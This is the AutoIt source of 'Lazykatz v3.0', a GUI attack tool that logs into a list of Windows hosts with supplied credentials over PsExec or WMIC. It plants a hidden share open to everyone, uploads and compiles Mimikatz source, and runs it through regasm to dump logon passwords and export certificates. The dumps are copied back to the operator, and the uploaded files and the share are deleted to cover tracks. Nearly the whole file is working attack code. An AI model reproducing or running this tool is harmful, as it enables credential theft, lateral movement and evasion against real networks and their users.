#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_Description=Lazykatz v3.0
#AutoIt3Wrapper_Res_Fileversion=3.0
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <File.au3>
#include <GUIConstants.au3>
#include <GUIConstantsEx.au3>
#include <GuiEdit.au3>
#include <GuiStatusBar.au3>
#include <WindowsConstants.au3>

;Local $iReturn = RunWait(@ComSpec & " /C " & 'powershell.exe -exec bypass -nop -command "import-module c:\Powerview.ps1;Get-NetDomainController" > b2.txt',"",@SW_HIDE,0x10000)


; PREPARING GUI

Global $dir = @WorkingDir
FileDelete(@TempDir & "\psexec.exe")
FileInstall("PsExec.exe", @TempDir & "\psexec.exe")
FileInstall("katz.cs", @TempDir & "\katz.cs")

$Form1 = GUICreate("Lazykatz v3.0", 700, 448, 192, 125)
GUICtrlCreateLabel("*** LAZYKATZ LOG ***", 490, 40, 150, 25)
Global $idEdit = GUICtrlCreateedit("", 430, 60, 250, 350)
GUICtrlCreateLabel("Username", 80, 40, 90, 25)
GUICtrlCreateLabel("Password", 80, 100, 90, 25)
GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
GUICtrlCreateLabel("Choose Method", 80, 215, 90, 25)
GUICtrlCreateLabel("Choose Attack", 80, 265, 90, 25)
Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
$Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
$run = GUICtrlCreateButton("Start",120, 320, 120, 25)
$radio1 = GUICtrlCreateRadio("PsExec",180, 210, 50, 25)
$radio2 = GUICtrlCreateRadio("WMIC",300, 210, 50, 25)
$check1 = GUICtrlCreateCheckbox("Logon passwords",180, 260, 100, 25)
$check2 = GUICtrlCreateCheckbox("Export certs",300, 260, 100, 25)
Global $log = ""
GUISetState(@SW_SHOW)

While 1
    $msg = GuiGetMsg()
    Select
    Case $msg = $GUI_EVENT_CLOSE
        ExitLoop
    Case $msg = $Button1
		Global $list = FileOpenDialog("Select the IP list", @WorkingDir, "text (*.txt)", 1 + 4 )
		$log = "Selected the IP list"&@CRLF&@CRLF&$list&@CRLF
		_GUICtrlEdit_SetText($idEdit, $log)
		_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
		Case $msg = $radio1
			Global $method = "psexec"
		case $msg = $radio2
			Global $method = "wmic"
		Case $msg = $run
			Global $user = GUICtrlRead($USER1)
			Global $pass = GUICtrlRead($PASS1)
			attack()
    Case Else
    ;;;;;;;
    EndSelect
WEnd

Func _IsChecked($idControlID)
    Return BitAND(GUICtrlRead($idControlID), $GUI_CHECKED) = $GUI_CHECKED
EndFunc   ;==>_IsChecked

; ATTACK FUNTION
Func attack()
FileChangeDir(@TempDir)
FileOpen($list, 0)
FileDelete("output.txt")

For $j = 1 to _FileCountLines($list)
    $ip = FileReadLine($list, $j)
	Sleep(1000)
	$log = "Targetting - "&$ip&@CRLF&@CRLF
	_GUICtrlEdit_SetText($idEdit, $log)
	_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
global $status = 1

;VALIDATING CREDENTIALS

if $method = "psexec" Then
	logprint("Validating credentials using PsExec" & @CRLF)
	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /delete /Y","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)
EndIf

if $method = "wmic" Then
	logprint("Validating credentials using WMIC" & @CRLF)
	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get status 2>&1 | findstr /R /I /C:".*" > output.txt',"",@SW_HIDE,0x10000)
EndIf
;----------------------------------------------

local $file = "output.txt"

FileOpen($file, 0)
For $i = 1 to _FileCountLines($file)
    $line = FileReadLine($file, $i)
	;MsgBox("","",$line)
	if StringInStr($line, "error") Then
		Sleep(1000)
		logprint("Error connecting - "&$ip & @CRLF)
	global $status = 0
	EndIf
	Next
FileClose($file)


if not $status = 0 Then
		logprint("Credentials are valid" & @CRLF)
;UPLOAD/COPY ATTACK FILES ON TARGET AND IDENTIFY OS TYPE

if $method = "psexec" Then
		logprint("Uploading files on target using PsExec" & @CRLF)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)
EndIf

if $method = "wmic" Then
	While Not FileExists("\\"&$ip&"\test$")
	logprint("Preparing for temporary remote share" & @CRLF)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo @echo off > c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo setlocal enabledelayedexpansion >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo set b=z1 >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo for /f \"tokens=3\" %%a in ('&"'help pushd') do ( >> c:\windows\temp\test.bat"&'"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo set b=%%a>> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo net share test$=c:\windows\temp /grant:everyone!b:~4!full >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c echo ) >> c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	logprint("Enabling temporary remote share" & @CRLF)
	RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c c:\windows\temp\test.bat"',"",@SW_HIDE,0x10000)
	sleep (10000)
	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\test$ /delete /Y","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\test$ /u:"&$user&" "&$pass&"","",@SW_HIDE,0x10000)
	WEnd
	logprint("Uploading files on remote share using WMIC" & @CRLF)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\test$\","",@SW_HIDE,0x10000)

	RunWait(@ComSpec & " /C " & 'wmic /node:'&$ip&' /user:'&$user&' /password:'&$pass &' os get osarchitecture > os.txt 2>&1',"",@SW_HIDE,0x10000)

	;RunWait(@ComSpec & " /C " & 'wmic /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' share call create "","","",lazykatz,"","c:\windows\temp\lazy",0',"",@SW_HIDE,0x10000)

EndIf

;--------------------------------------------------------

local $osfile = "os.txt"
FileOpen($osfile, 0)

For $i = 1 to _FileCountLines($osfile)
    $line = FileReadLine($osfile, $i)
	if StringInStr($line, "86") Then
	global $os = ""
	Else
	global $os = "64"
	EndIf
	;MsgBox("","",$os)
	Next
FileClose($osfile)
		logprint("Identified "&$os&"bit OS" & @CRLF)
; IDENTIFY .NET FRAMEWORK
if $method = "psexec" Then
	RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "regasm.exe" | find /I /V "regasm.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)
	Global $split = 8
EndIf
if $method = "wmic" Then
	_FileCreate ("framework.txt")
	RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c dir /L /A /B /S c:\windows\Microsoft.NET\Framework'&$os&'\ | find \"regasm.exe\" | find /I /V \"regasm.exe.conf\" > c:\windows\temp\framework.txt"',"",@SW_HIDE,0x10000)
	while FileGetSize("framework.txt") = 0
			Sleep (1000)
			RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\framework.txt framework.txt","",@SW_HIDE,0x10000)
			Global $split = 5
	WEnd
EndIf

;--------------------------------------------

local $fwfile = "framework.txt"
FileOpen($fwfile, 0)

For $i = 1 to _FileCountLines($fwfile)
    $line = FileReadLine($fwfile, $i)
	global $fw = StringSplit($line, '\', $STR_ENTIRESPLIT)[$split]
	;MsgBox("","",$fw)
	ExitLoop
	Next
FileClose($fwfile)
logprint("Will use .NET Firmware "&$fw&"" & @CRLF)
; GENERATING LAZY.BAT
if $fw Then
RunWait(@ComSpec & " /C " & "echo @echo off > lazy.bat","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
if _IsChecked($check1) Then
	RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
EndIf
if _IsChecked($check2) Then
	RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "crypto::capi" "crypto::certificates /export" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
EndIf

;---------------------------------
;COPY LAZY.BAT ON TARGET
if $method = "psexec" Then
	RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
EndIf
if $method = "wmic" Then
	RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\test$\","",@SW_HIDE,0x10000)
EndIf
logprint("Uploaded lazy.bat on target" & @CRLF)
;---------------------------------
;EXECUTING LAZY.BAT ON TARGET
if $method = "psexec" Then
	RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h c:\windows\temp\lazy.bat',"",@SW_HIDE,0x10000)
EndIf

if $method = "wmic" Then
	While Not FileExists("\\"&$ip&"\test$\mimikatz.log")
		RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' process call create "cmd /c c:\windows\temp\lazy.bat"',"",@SW_HIDE,0x10000)
		Sleep(10000)
	WEnd
EndIf
;--------------------------------

logprint("Executed lazy.bat on target" & @CRLF)

;COPY MIMIKATZ.LOG FROM TARGET AND CLEAN TARGET


if $method = "psexec" Then
	logprint("Copying mimikatz.log from target" & @CRLF)
	if _IsChecked($check1) Then
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
	EndIf
	if _IsChecked($check2) Then
		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
	EndIf

	logprint("Cleaning uploded files and established session" & @CRLF)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\*.der","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\*.pfx","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /delete","",@SW_HIDE,0x10000)
EndIf
if $method = "wmic" Then
	While FileGetSize("\\"&$ip&"\test$\mimikatz.log") = 0
		Sleep(1000)
	WEnd
	logprint("Cleaning uploded files" & @CRLF)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\katz.cs","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimi.exe","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\lazy.bat","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\test.bat","",@SW_HIDE,0x10000)
	RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\framework.txt","",@SW_HIDE,0x10000)
	logprint("Copying mimikatz.log from target" & @CRLF)
	if _IsChecked($check1) Then
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\mimikatz.log","",@SW_HIDE,0x10000)
	EndIf
	if _IsChecked($check2) Then
		RunWait(@ComSpec & " /C " & "mkdir "&$dir&"\certs_"&$ip,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.der "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\test$\*.pfx "&$dir&"\certs_"&$ip&"\" ,"",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\*.der","",@SW_HIDE,0x10000)
		RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\test$\*.pfx","",@SW_HIDE,0x10000)
	EndIf
	While FileExists("\\"&$ip&"\test$")
		logprint("Disabling temporary remote share" & @CRLF)
		RunWait(@ComSpec & " /C " & 'wmic  /output:wlog.txt /node:'&$ip&' /user:'&$user&' /password:'&$pass &' SHARE where name="test$" call delete',"",@SW_HIDE,0x10000)
		sleep(1000)
	WEnd
EndIf
;--------------------------------
EndIf
EndIf
Next
FileClose($list)
MsgBox("","","Attack finished.")
Exit
EndFunc
func logprint($catch)
	$log &= $catch & @CRLF
	_GUICtrlEdit_SetText($idEdit, $log)
	_GUICtrlEdit_LineScroll($idEdit, 0, _GUICtrlEdit_GetLineCount($idEdit))
EndFunc
